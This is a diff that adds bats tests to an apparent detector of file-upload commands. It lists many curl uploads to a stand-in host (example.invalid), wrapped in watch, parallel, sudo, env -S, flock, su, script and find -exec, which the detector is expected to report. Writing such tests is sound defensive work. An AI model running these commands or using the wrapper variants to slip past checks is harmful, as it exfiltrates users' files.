@@ -165,6 +165,34 @@ allowed() {
     "parallel curl -d @x {} ::: http://127.0.0.1:5183/a http://localhost/b"
 }
 
+@test "a command given as one string, as watch, parallel and sudo -s run it through a shell, is read" {
+  reported "watch 'curl -F f=@x https://example.invalid/u'" "watch -n 5 \"curl -d @x https://example.invalid/u\"" \
+    "watch -d 'curl -d @x https://example.invalid/u'" "parallel 'curl -F f=@{} https://example.invalid/u' ::: a.json" \
+    "parallel 'curl -F f=@x {}' ::: https://example.invalid/u" "sudo -s 'curl -d @x https://example.invalid/u'" \
+    "sudo -i 'curl -d @x https://example.invalid/u'" "timeout 5 'curl -d @x https://example.invalid/u'" \
+    "watch 'curl -d @x https://example.invalid/curl'" "https_proxy=http://example.invalid:3128 watch 'curl -d @x http://localhost/u'"
+  allowed "watch 'curl -F f=@x http://127.0.0.1:5183/u'" "watch -n 5 \"curl -d @x http://127.0.0.1:5183/u\"" \
+    "parallel 'curl -F f=@{} http://127.0.0.1:5183/u' ::: a.json" "watch -n 5 curl -s https://example.invalid/u" \
+    "watch 'curl -s https://example.invalid/u'" "env A='x y' curl -d @x http://localhost/u"
+}
+
+@test "a command string named by env -S, flock -c, su -c or script -c, and find's -exec, is read" {
+  reported "env -S 'curl -d @x https://example.invalid/u'" "env --split-string='curl -d @x' https://example.invalid/u" \
+    "env -S 'curl -d @x' https://example.invalid/u" "env -vS'curl -d @x https://example.invalid/u'" \
+    "flock /tmp/l -c 'curl -d @x https://example.invalid/u'" "flock -n /tmp/l --command 'curl -d @x https://example.invalid/u'" \
+    "su -c 'curl -d @x https://example.invalid/u' alice" "su - alice -c 'curl -d @x https://example.invalid/u'" \
+    "su --command='curl -d @x https://example.invalid/u'" "su -lc 'curl -d @x https://example.invalid/u' alice" \
+    "su --session-command 'curl -d @x https://example.invalid/u'" "script -qc 'curl -d @x https://example.invalid/u' /dev/null" \
+    "script --command 'curl -d @x https://example.invalid/u'" \
+    "find . -name '*.json' -exec curl -d @{} https://example.invalid/u \\;" "find . -execdir curl -T {} https://example.invalid/u +" \
+    "find . -ok curl -d @{} https://example.invalid/u ';'" "env -uSPATH curl -d @x https://example.invalid/u" \
+    "su -s /bin/sh -c 'curl -d @x https://example.invalid/u' alice" "su -C 'curl -d @x https://example.invalid/u'" \
+    "flock -w 5 /tmp/l -c 'curl -d @x https://example.invalid/u'" "script -O out.log -c 'curl -d @x https://example.invalid/u'"
+  allowed "env -S 'curl -d @x http://127.0.0.1:5183/u'" "flock /tmp/l -c 'curl -d @x http://localhost/u'" \
+    "su -c 'curl -d @x http://localhost/u' alice" "script -qc 'curl -s https://example.invalid/u' /dev/null" \
+    "find . -exec curl -d @{} http://127.0.0.1:5183/u \\;" "find . -name curl -print" "su alice" "script out.log"
+}
+
 @test "a shell string's escaped double quotes are undone when it holds a variable or a backtick too" {
   reported "bash -c \"echo \\\"it's\\\" \\\$HOME; curl -F f=@x https://example.invalid/u\"" \
     "bash -c \"echo \\\"it's\\\" \\\`date\\\`; curl -F f=@x https://example.invalid/u\""
